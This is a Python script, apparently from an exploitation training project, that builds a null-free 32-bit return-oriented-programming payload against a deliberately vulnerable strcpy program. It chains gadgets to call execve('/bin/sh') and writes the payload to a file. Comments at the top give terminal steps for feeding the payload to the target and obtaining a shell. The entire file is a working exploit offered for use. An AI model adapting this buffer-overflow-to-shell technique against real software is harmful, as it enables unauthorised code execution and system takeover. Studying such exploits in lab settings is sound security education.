import pathlib
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - (cat ./bin/mypipe ; cat) | ./bin/vulnerable32bit.exe strcpy
# - Run in another terminal:
#     - python3 ./exploits/payloadExecveShell32.py && cat ./exploits/payloadExecveShell32.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds. You now have a shell. Test with "echo hi".


if __name__ == "__main__":
    Utils.changeCWDToScriptDirectory()

    print('Scanning bytes...')
    eb = ExploitBuilder(targetProcessName='vulnerable32bit.exe',
                        archBitSize=32,
                        extraToolOptions=['--no-null'])

    # We want to make a ROP payload - without NULL bytes -
    # that calls `execve("/bin/sh", NULL, NULL)`. For this we need:
    # - EAX = the system call number for execve, namely 11 / 0x0b;
    # - First argument (EBX) = address of "/bin/sh"
    #   "/bin/sh" is placed at the end of the stack.
    # - Second argument (ECX) = 0 (NULL);
    # - Third argument (EDX) = 0 (NULL);
    # - Make the system call with the `int 0x80` instruction.

    estimationOfLocalStackByteSize = 200

    payloadComponents = [
        # A "NOP" sled. It's long enough to go over the stack buffer and cover the stored return address.
        eb.getBytesOfInstrSeqAddress('ret') * (estimationOfLocalStackByteSize // eb.archByteSize),

        # Set RBX to "/bin/sh"
            # EBX = ESP
            eb.getBytesOfInstrSeqAddress('push esp; pop ebx; pop esi; ret'),
            (0x12345678).to_bytes(4, 'little'), # junk value for ESI

            # EAX = EBX (i.e. ESP)
            # We temporarily move the value to EAX in order to do some arithmetic on it first.
            eb.getBytesOfInstrSeqAddress('mov eax, ebx; pop ebx; ret'),
            (0x12345678).to_bytes(4, 'little'), # junk value for EBX

            # Increase the value of EAX such that it points to the end of the paylaod,
            # and, more specifically, so that EAX points to "/bin/sh"
            eb.getBytesOfInstrSeqAddress('add eax, 0xf; ret'),
            eb.getBytesOfInstrSeqAddress('add eax, 0xf; ret'),
            eb.getBytesOfInstrSeqAddress('add eax, 0xf; ret'),
            eb.getBytesOfInstrSeqAddress('add eax, 0xf; ret'),

            # EBX = EAX (i.e. the address of "/bin/sh"); EAX = junk;
            eb.getBytesOfInstrSeqAddress('xchg ebx, eax; add al, 0x83; ret'),

        # ECX = 0 (NULL)
        eb.getBytesOfInstrSeqAddress('mov ecx, 0xffffffff; cmovb eax, ecx; ret'),
        eb.getBytesOfInstrSeqAddress('inc ecx; ret'),

        # EDX = 0 (NULL); Also, EAX = 0.
        eb.getBytesOfInstrSeqAddress('xor edx, edx; mov eax, edx; ret'),

        # EAX = 11 (The system call number for `execve()` on x86-32)
        eb.getBytesOfInstrSeqAddress('xor eax, eax; ret'), # redundant because of above
        eb.getBytesOfInstrSeqAddress('add eax, 0xa; ret'),
        eb.getBytesOfInstrSeqAddress('inc eax; ret'),

        # call `execve("/bin/sh", NULL, NULL)`
        eb.getBytesOfInstrSeqAddress('int 0x80; ret'),

        # Place this string in the payload so that we can get a pointer to it.
        # Since the NULL byte is at the very end of the payload, it's not a problem for `strcpy()`.
        ExploitBuilder.convertStringToCStringBytes('/bin/sh'),
    ]

    # Concatenate payload
    payload = b''.join(payloadComponents)

    # Prepend the size of the payload to itself
    payloadSize = len(payload)
    payload = payloadSize.to_bytes(4, sys.byteorder) + payload

    print()
    print(f"len(payload) = {len(payload)}")
    print(f"payload = {payload.hex()}")

    scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
    with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
        fout.write(payload)
